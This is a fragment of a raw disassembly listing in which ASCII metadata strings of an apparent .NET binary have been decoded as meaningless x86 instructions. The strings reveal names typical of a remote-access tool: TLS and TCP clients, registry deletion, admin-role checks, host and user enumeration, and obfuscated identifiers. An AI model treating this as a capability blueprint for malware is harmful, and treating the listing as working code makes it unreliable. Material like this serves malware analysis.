  4084ff:	66 65 72 3e          	data16 gs jb 0x408541
  408503:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  408507:	61                   	popa
  408508:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40850b:	6e                   	outsb  %ds:(%esi),(%dx)
  40850c:	67 46                	addr16 inc %esi
  40850e:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  408515:	66 66 73 65          	data16 data16 jae 0x40857e
  408519:	74 3e                	je     0x408559
  40851b:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40851f:	61                   	popa
  408520:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408523:	6e                   	outsb  %ds:(%esi),(%dx)
  408524:	67 46                	addr16 inc %esi
  408526:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  40852d:	73 6c                	jae    0x40859b
  40852f:	43                   	inc    %ebx
  408530:	6c                   	insb   (%dx),%es:(%edi)
  408531:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408538:	5f                   	pop    %edi
  408539:	42                   	inc    %edx
  40853a:	61                   	popa
  40853b:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40853e:	6e                   	outsb  %ds:(%esi),(%dx)
  40853f:	67 46                	addr16 inc %esi
  408541:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  408548:	63 70 43             	arpl   %esi,0x43(%eax)
  40854b:	6c                   	insb   (%dx),%es:(%edi)
  40854c:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  408553:	5f                   	pop    %edi
  408554:	42                   	inc    %edx
  408555:	61                   	popa
  408556:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408559:	6e                   	outsb  %ds:(%esi),(%dx)
  40855a:	67 46                	addr16 inc %esi
  40855c:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  408563:	70 65                	jo     0x4085ca
  408565:	6e                   	outsb  %ds:(%esi),(%dx)
  408566:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40856a:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408571:	61 
  408572:	6c                   	insb   (%dx),%es:(%edi)
  408573:	75 65                	jne    0x4085da
  408575:	4b                   	dec    %ebx
  408576:	69 6e 64 00 66 66 75 	imul   $0x75666600,0x64(%esi),%ebp
  40857d:	51                   	push   %ecx
  40857e:	43                   	inc    %ebx
  40857f:	72 4e                	jb     0x4085cf
  408581:	53                   	push   %ebx
  408582:	70 6b                	jo     0x4085ef
  408584:	6d                   	insl   (%dx),%es:(%edi)
  408585:	6a 44                	push   $0x44
  408587:	65 00 71 6f          	add    %dh,%gs:0x6f(%ecx)
  40858b:	65 79 63             	gs jns 0x4085f1
  40858e:	76 4f                	jbe    0x4085df
  408590:	56                   	push   %esi
  408591:	52                   	push   %edx
  408592:	75 54                	jne    0x4085e8
  408594:	72 48                	jb     0x4085de
  408596:	65 00 54 45 78       	add    %dl,%gs:0x78(%ebp,%eax,2)
  40859b:	71 68                	jno    0x408605
  40859d:	44                   	inc    %esp
  40859e:	4b                   	dec    %ebx
  40859f:	47                   	inc    %edi
  4085a0:	77 4d                	ja     0x4085ef
  4085a2:	65 00 6e 64          	add    %ch,%gs:0x64(%esi)
  4085a6:	67 43                	addr16 inc %ebx
  4085a8:	75 70                	jne    0x40861a
  4085aa:	56                   	push   %esi
  4085ab:	78 4e                	js     0x4085fb
  4085ad:	78 6c                	js     0x40861b
  4085af:	59                   	pop    %ecx
  4085b0:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4085b4:	70 6c                	jo     0x408622
  4085b6:	61                   	popa
  4085b7:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085ba:	43                   	inc    %ebx
  4085bb:	72 65                	jb     0x408622
  4085bd:	61                   	popa
  4085be:	74 65                	je     0x408625
  4085c0:	49                   	dec    %ecx
  4085c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c2:	73 74                	jae    0x408638
  4085c4:	61                   	popa
  4085c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c6:	63 65 00             	arpl   %esp,0x0(%ebp)
  4085c9:	73 65                	jae    0x408630
  4085cb:	74 5f                	je     0x40862c
  4085cd:	4d                   	dec    %ebp
  4085ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4085cf:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  4085d4:	6c                   	insb   (%dx),%es:(%edi)
  4085d5:	65 4d                	gs dec %ebp
  4085d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d8:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  4085dd:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  4085e4:	64 65 
  4085e6:	00 45 6e             	add    %al,0x6e(%ebp)
  4085e9:	74 65                	je     0x408650
  4085eb:	72 44                	jb     0x408631
  4085ed:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4085f1:	4d                   	dec    %ebp
  4085f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4085f3:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  4085f8:	79 70                	jns    0x40866a
  4085fa:	74 6f                	je     0x40866b
  4085fc:	53                   	push   %ebx
  4085fd:	74 72                	je     0x408671
  4085ff:	65 61                	gs popa
  408601:	6d                   	insl   (%dx),%es:(%edi)
  408602:	4d                   	dec    %ebp
  408603:	6f                   	outsl  %ds:(%esi),(%dx)
  408604:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  408609:	6d                   	insl   (%dx),%es:(%edi)
  40860a:	70 72                	jo     0x40867e
  40860c:	65 73 73             	gs jae 0x408682
  40860f:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408616:	00 43 69             	add    %al,0x69(%ebx)
  408619:	70 68                	jo     0x408683
  40861b:	65 72 4d             	gs jb  0x40866b
  40861e:	6f                   	outsl  %ds:(%esi),(%dx)
  40861f:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408624:	6c                   	insb   (%dx),%es:(%edi)
  408625:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  40862a:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  408630:	65 74 65             	gs je  0x408698
  408633:	53                   	push   %ebx
  408634:	75 62                	jne    0x408698
  408636:	4b                   	dec    %ebx
  408637:	65 79 54             	gs jns 0x40868e
  40863a:	72 65                	jb     0x4086a1
  40863c:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408640:	74 5f                	je     0x4086a1
  408642:	4d                   	dec    %ebp
  408643:	65 73 73             	gs jae 0x4086b9
  408646:	61                   	popa
  408647:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  40864c:	76 6f                	jbe    0x4086bd
  40864e:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  408652:	45                   	inc    %ebp
  408653:	6e                   	outsb  %ds:(%esi),(%dx)
  408654:	75 6d                	jne    0x4086c3
  408656:	65 72 61             	gs jb  0x4086ba
  408659:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40865d:	49                   	dec    %ecx
  40865e:	44                   	inc    %esp
  40865f:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  408666:	6c                   	insb   (%dx),%es:(%edi)
  408667:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  40866c:	6f                   	outsl  %ds:(%esi),(%dx)
  40866d:	75 62                	jne    0x4086d1
  40866f:	6c                   	insb   (%dx),%es:(%edi)
  408670:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408674:	74 5f                	je     0x4086d5
  408676:	48                   	dec    %eax
  408677:	61                   	popa
  408678:	6e                   	outsb  %ds:(%esi),(%dx)
  408679:	64 6c                	fs insb (%dx),%es:(%edi)
  40867b:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40867f:	6e                   	outsb  %ds:(%esi),(%dx)
  408680:	74 69                	je     0x4086eb
  408682:	6d                   	insl   (%dx),%es:(%edi)
  408683:	65 46                	gs inc %esi
  408685:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  40868c:	64 6c                	fs insb (%dx),%es:(%edi)
  40868e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408692:	74 4d                	je     0x4086e1
  408694:	6f                   	outsl  %ds:(%esi),(%dx)
  408695:	64 75 6c             	fs jne 0x408704
  408698:	65 48                	gs dec %eax
  40869a:	61                   	popa
  40869b:	6e                   	outsb  %ds:(%esi),(%dx)
  40869c:	64 6c                	fs insb (%dx),%es:(%edi)
  40869e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4086a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4086a3:	74 69                	je     0x40870e
  4086a5:	6d                   	insl   (%dx),%es:(%edi)
  4086a6:	65 54                	gs push %esp
  4086a8:	79 70                	jns    0x40871a
  4086aa:	65 48                	gs dec %eax
  4086ac:	61                   	popa
  4086ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ae:	64 6c                	fs insb (%dx),%es:(%edi)
  4086b0:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4086b4:	74 54                	je     0x40870a
  4086b6:	79 70                	jns    0x408728
  4086b8:	65 46                	gs inc %esi
  4086ba:	72 6f                	jb     0x40872b
  4086bc:	6d                   	insl   (%dx),%es:(%edi)
  4086bd:	48                   	dec    %eax
  4086be:	61                   	popa
  4086bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4086c0:	64 6c                	fs insb (%dx),%es:(%edi)
  4086c2:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  4086c6:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  4086cd:	65 
  4086ce:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  4086d2:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  4086d9:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  4086e0:	6e 
  4086e1:	52                   	push   %edx
  4086e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4086e3:	6c                   	insb   (%dx),%es:(%edi)
  4086e4:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  4086e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e9:	64 6f                	outsl  %fs:(%esi),(%dx)
  4086eb:	77 73                	ja     0x408760
  4086ed:	42                   	inc    %edx
  4086ee:	75 69                	jne    0x408759
  4086f0:	6c                   	insb   (%dx),%es:(%edi)
  4086f1:	74 49                	je     0x40873c
  4086f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f4:	52                   	push   %edx
  4086f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f6:	6c                   	insb   (%dx),%es:(%edi)
  4086f7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086fb:	74 5f                	je     0x40875c
  4086fd:	4d                   	dec    %ebp
  4086fe:	61                   	popa
  4086ff:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  408706:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40870a:	6f                   	outsl  %ds:(%esi),(%dx)
  40870b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40870e:	73 4d                	jae    0x40875d
  408710:	6f                   	outsl  %ds:(%esi),(%dx)
  408711:	64 75 6c             	fs jne 0x408780
  408714:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408718:	74 5f                	je     0x408779
  40871a:	57                   	push   %edi
  40871b:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408722:	79 6c                	jns    0x408790
  408724:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408728:	6f                   	outsl  %ds:(%esi),(%dx)
  408729:	63 65 73             	arpl   %esp,0x73(%ebp)
  40872c:	73 57                	jae    0x408785
  40872e:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  408735:	79 6c                	jns    0x4087a3
  408737:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40873b:	74 5f                	je     0x40879c
  40873d:	4e                   	dec    %esi
  40873e:	61                   	popa
  40873f:	6d                   	insl   (%dx),%es:(%edi)
  408740:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408744:	74 5f                	je     0x4087a5
  408746:	46                   	inc    %esi
  408747:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40874e:	00 
  40874f:	73 65                	jae    0x4087b6
  408751:	74 5f                	je     0x4087b2
  408753:	46                   	inc    %esi
  408754:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40875b:	00 
  40875c:	47                   	inc    %edi
  40875d:	65 74 54             	gs je  0x4087b4
  408760:	65 6d                	gs insl (%dx),%es:(%edi)
  408762:	70 46                	jo     0x4087aa
  408764:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40876b:	00 
  40876c:	47                   	inc    %edi
  40876d:	65 74 46             	gs je  0x4087b6
  408770:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408777:	00 
  408778:	67 65 74 5f          	addr16 gs je 0x4087db
  40877c:	4d                   	dec    %ebp
  40877d:	61                   	popa
  40877e:	63 68 69             	arpl   %ebp,0x69(%eax)
  408781:	6e                   	outsb  %ds:(%esi),(%dx)
  408782:	65 4e                	gs dec %esi
  408784:	61                   	popa
  408785:	6d                   	insl   (%dx),%es:(%edi)
  408786:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40878a:	74 5f                	je     0x4087eb
  40878c:	4f                   	dec    %edi
  40878d:	53                   	push   %ebx
  40878e:	46                   	inc    %esi
  40878f:	75 6c                	jne    0x4087fd
  408791:	6c                   	insb   (%dx),%es:(%edi)
  408792:	4e                   	dec    %esi
  408793:	61                   	popa
  408794:	6d                   	insl   (%dx),%es:(%edi)
  408795:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408799:	74 5f                	je     0x4087fa
  40879b:	46                   	inc    %esi
  40879c:	75 6c                	jne    0x40880a
  40879e:	6c                   	insb   (%dx),%es:(%edi)
  40879f:	4e                   	dec    %esi
  4087a0:	61                   	popa
  4087a1:	6d                   	insl   (%dx),%es:(%edi)
  4087a2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4087a6:	74 5f                	je     0x408807
  4087a8:	55                   	push   %ebp
  4087a9:	73 65                	jae    0x408810
  4087ab:	72 4e                	jb     0x4087fb
  4087ad:	61                   	popa
  4087ae:	6d                   	insl   (%dx),%es:(%edi)
  4087af:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  4087b3:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  4087b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b8:	73 74                	jae    0x40882e
  4087ba:	4e                   	dec    %esi
  4087bb:	61                   	popa
  4087bc:	6d                   	insl   (%dx),%es:(%edi)
  4087bd:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  4087c2:	65 54                	gs push %esp
  4087c4:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  4087cb:	5f                   	pop    %edi
  4087cc:	4c                   	dec    %esp
  4087cd:	61                   	popa
  4087ce:	73 74                	jae    0x408844
  4087d0:	57                   	push   %edi
  4087d1:	72 69                	jb     0x40883c
  4087d3:	74 65                	je     0x40883a
  4087d5:	54                   	push   %esp
  4087d6:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  4087dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4087de:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  4087e5:	54                   	push   %esp
  4087e6:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  4087ed:	74 65                	je     0x408854
  4087ef:	4c                   	dec    %esp
  4087f0:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  4087f7:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  4087fa:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  4087fe:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408805:	6d                   	insl   (%dx),%es:(%edi)
  408806:	65 54                	gs push %esp
  408808:	79 70                	jns    0x40887a
  40880a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40880e:	74 5f                	je     0x40886f
  408810:	56                   	push   %esi
  408811:	61                   	popa
  408812:	6c                   	insb   (%dx),%es:(%edi)
  408813:	75 65                	jne    0x40887a
  408815:	54                   	push   %esp
  408816:	79 70                	jns    0x408888
  408818:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40881c:	6f                   	outsl  %ds:(%esi),(%dx)
  40881d:	74 6f                	je     0x40888e
  40881f:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408822:	54                   	push   %esp
  408823:	79 70                	jns    0x408895
  408825:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408829:	74 54                	je     0x40887f
  40882b:	79 70                	jns    0x40889d
  40882d:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408831:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408834:	74 54                	je     0x40888a
  408836:	79 70                	jns    0x4088a8
  408838:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40883c:	6c                   	insb   (%dx),%es:(%edi)
  40883d:	65 53                	gs push %ebx
  40883f:	68 61 72 65 00       	push   $0x657261
  408844:	53                   	push   %ebx
  408845:	79 73                	jns    0x4088ba
  408847:	74 65                	je     0x4088ae
  408849:	6d                   	insl   (%dx),%es:(%edi)
  40884a:	2e 43                	cs inc %ebx
  40884c:	6f                   	outsl  %ds:(%esi),(%dx)
  40884d:	72 65                	jb     0x4088b4
  40884f:	00 43 6c             	add    %al,0x6c(%ebx)
  408852:	6f                   	outsl  %ds:(%esi),(%dx)
  408853:	73 65                	jae    0x4088ba
  408855:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408859:	70 6f                	jo     0x4088ca
  40885b:	73 65                	jae    0x4088c2
  40885d:	00 50 61             	add    %dl,0x61(%eax)
  408860:	72 73                	jb     0x4088d5
  408862:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408866:	72 52                	jb     0x4088ba
  408868:	65 76 65             	gs jbe 0x4088d0
  40886b:	72 73                	jb     0x4088e0
  40886d:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  408871:	30 39                	xor    %bh,(%ecx)
  408873:	43                   	inc    %ebx
  408874:	65 72 74             	gs jb  0x4088eb
  408877:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40887e:	00 43 72             	add    %al,0x72(%ebx)
  408881:	65 61                	gs popa
  408883:	74 65                	je     0x4088ea
  408885:	00 53 65             	add    %dl,0x65(%ebx)
  408888:	74 54                	je     0x4088de
  40888a:	68 72 65 61 64       	push   $0x64616572
  40888f:	45                   	inc    %ebp
  408890:	78 65                	js     0x4088f7
  408892:	63 75 74             	arpl   %esi,0x74(%ebp)
  408895:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40889c:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4088a1:	65 74 65             	gs je  0x408909
  4088a4:	00 43 61             	add    %al,0x61(%ebx)
  4088a7:	6c                   	insb   (%dx),%es:(%edi)
  4088a8:	6c                   	insb   (%dx),%es:(%edi)
  4088a9:	53                   	push   %ebx
  4088aa:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  4088b1:	74 
  4088b2:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4088b6:	6d                   	insl   (%dx),%es:(%edi)
  4088b7:	70 69                	jo     0x408922
  4088b9:	6c                   	insb   (%dx),%es:(%edi)
  4088ba:	65 72 47             	gs jb  0x408904
  4088bd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4088bf:	65 72 61             	gs jb  0x408923
  4088c2:	74 65                	je     0x408929
  4088c4:	64 41                	fs inc %ecx
  4088c6:	74 74                	je     0x40893c
  4088c8:	72 69                	jb     0x408933
  4088ca:	62 75 74             	bound  %esi,0x74(%ebp)
  4088cd:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4088d2:	75 67                	jne    0x40893b
  4088d4:	67 61                	addr16 popa
  4088d6:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  4088da:	74 74                	je     0x408950
  4088dc:	72 69                	jb     0x408947
  4088de:	62 75 74             	bound  %esi,0x74(%ebp)
  4088e1:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4088e5:	6d                   	insl   (%dx),%es:(%edi)
  4088e6:	56                   	push   %esi
  4088e7:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  4088ee:	74 74                	je     0x408964
  4088f0:	72 69                	jb     0x40895b
  4088f2:	62 75 74             	bound  %esi,0x74(%ebp)
  4088f5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088f9:	73 65                	jae    0x408960
  4088fb:	6d                   	insl   (%dx),%es:(%edi)
  4088fc:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408900:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408907:	72 
  408908:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40890f:	73 73                	jae    0x408984
  408911:	65 6d                	gs insl (%dx),%es:(%edi)
  408913:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408917:	72 61                	jb     0x40897a
  408919:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40891c:	61                   	popa
  40891d:	72 6b                	jb     0x40898a
  40891f:	41                   	inc    %ecx
  408920:	74 74                	je     0x408996
  408922:	72 69                	jb     0x40898d
  408924:	62 75 74             	bound  %esi,0x74(%ebp)
  408927:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40892c:	67 65 74 46          	addr16 gs je 0x408976
  408930:	72 61                	jb     0x408993
  408932:	6d                   	insl   (%dx),%es:(%edi)
  408933:	65 77 6f             	gs ja  0x4089a5
  408936:	72 6b                	jb     0x4089a3
  408938:	41                   	inc    %ecx
  408939:	74 74                	je     0x4089af
  40893b:	72 69                	jb     0x4089a6
  40893d:	62 75 74             	bound  %esi,0x74(%ebp)
  408940:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408944:	73 65                	jae    0x4089ab
  408946:	6d                   	insl   (%dx),%es:(%edi)
  408947:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40894b:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  408952:	69 
  408953:	6f                   	outsl  %ds:(%esi),(%dx)
  408954:	6e                   	outsb  %ds:(%esi),(%dx)
  408955:	41                   	inc    %ecx
  408956:	74 74                	je     0x4089cc
  408958:	72 69                	jb     0x4089c3
  40895a:	62 75 74             	bound  %esi,0x74(%ebp)
  40895d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408961:	73 65                	jae    0x4089c8
  408963:	6d                   	insl   (%dx),%es:(%edi)
  408964:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408968:	6f                   	outsl  %ds:(%esi),(%dx)
  408969:	6e                   	outsb  %ds:(%esi),(%dx)
  40896a:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  408970:	74 69                	je     0x4089db
  408972:	6f                   	outsl  %ds:(%esi),(%dx)
  408973:	6e                   	outsb  %ds:(%esi),(%dx)
  408974:	41                   	inc    %ecx
  408975:	74 74                	je     0x4089eb
  408977:	72 69                	jb     0x4089e2
  408979:	62 75 74             	bound  %esi,0x74(%ebp)
  40897c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408980:	73 65                	jae    0x4089e7
  408982:	6d                   	insl   (%dx),%es:(%edi)
  408983:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  408987:	65 73 63             	gs jae 0x4089ed
  40898a:	72 69                	jb     0x4089f5
  40898c:	70 74                	jo     0x408a02
  40898e:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408995:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40899c:	65 66 61             	gs popaw
  40899f:	75 6c                	jne    0x408a0d
  4089a1:	74 4d                	je     0x4089f0
  4089a3:	65 6d                	gs insl (%dx),%es:(%edi)
  4089a5:	62 65 72             	bound  %esp,0x72(%ebp)
  4089a8:	41                   	inc    %ecx
  4089a9:	74 74                	je     0x408a1f
  4089ab:	72 69                	jb     0x408a16
  4089ad:	62 75 74             	bound  %esi,0x74(%ebp)
  4089b0:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4089b4:	6d                   	insl   (%dx),%es:(%edi)
  4089b5:	70 69                	jo     0x408a20
  4089b7:	6c                   	insb   (%dx),%es:(%edi)
  4089b8:	61                   	popa
  4089b9:	74 69                	je     0x408a24
  4089bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4089bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bd:	52                   	push   %edx
  4089be:	65 6c                	gs insb (%dx),%es:(%edi)
  4089c0:	61                   	popa
  4089c1:	78 61                	js     0x408a24
  4089c3:	74 69                	je     0x408a2e
  4089c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4089c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c7:	73 41                	jae    0x408a0a
  4089c9:	74 74                	je     0x408a3f
  4089cb:	72 69                	jb     0x408a36
  4089cd:	62 75 74             	bound  %esi,0x74(%ebp)
  4089d0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089d4:	73 65                	jae    0x408a3b
  4089d6:	6d                   	insl   (%dx),%es:(%edi)
  4089d7:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  4089db:	72 6f                	jb     0x408a4c
  4089dd:	64 75 63             	fs jne 0x408a43
  4089e0:	74 41                	je     0x408a23
  4089e2:	74 74                	je     0x408a58
  4089e4:	72 69                	jb     0x408a4f
  4089e6:	62 75 74             	bound  %esi,0x74(%ebp)
  4089e9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4089ed:	73 65                	jae    0x408a54
  4089ef:	6d                   	insl   (%dx),%es:(%edi)
  4089f0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4089f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f5:	70 79                	jo     0x408a70
  4089f7:	72 69                	jb     0x408a62
  4089f9:	67 68 74 41 74 74    	addr16 push $0x74744174
  4089ff:	72 69                	jb     0x408a6a
  408a01:	62 75 74             	bound  %esi,0x74(%ebp)
  408a04:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408a08:	73 65                	jae    0x408a6f
  408a0a:	6d                   	insl   (%dx),%es:(%edi)
  408a0b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a10:	6d                   	insl   (%dx),%es:(%edi)
  408a11:	70 61                	jo     0x408a74
  408a13:	6e                   	outsb  %ds:(%esi),(%dx)
  408a14:	79 41                	jns    0x408a57
  408a16:	74 74                	je     0x408a8c
  408a18:	72 69                	jb     0x408a83
  408a1a:	62 75 74             	bound  %esi,0x74(%ebp)
  408a1d:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408a21:	6e                   	outsb  %ds:(%esi),(%dx)
  408a22:	74 69                	je     0x408a8d
  408a24:	6d                   	insl   (%dx),%es:(%edi)
  408a25:	65 43                	gs inc %ebx
  408a27:	6f                   	outsl  %ds:(%esi),(%dx)
  408a28:	6d                   	insl   (%dx),%es:(%edi)
  408a29:	70 61                	jo     0x408a8c
  408a2b:	74 69                	je     0x408a96
  408a2d:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408a30:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  408a37:	69 
  408a38:	62 75 74             	bound  %esi,0x74(%ebp)
  408a3b:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408a3f:	74 5f                	je     0x408aa0
  408a41:	55                   	push   %ebp
  408a42:	73 65                	jae    0x408aa9
  408a44:	53                   	push   %ebx
  408a45:	68 65 6c 6c 45       	push   $0x456c6c65
  408a4a:	78 65                	js     0x408ab1
  408a4c:	63 75 74             	arpl   %esi,0x74(%ebp)
  408a4f:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  408a53:	61                   	popa
  408a54:	64 42                	fs inc %edx
  408a56:	79 74                	jns    0x408acc
  408a58:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408a5c:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  408a63:	00 
  408a64:	44                   	inc    %esp
  408a65:	65 6c                	gs insb (%dx),%es:(%edi)
  408a67:	65 74 65             	gs je  0x408acf
  408a6a:	56                   	push   %esi
  408a6b:	61                   	popa
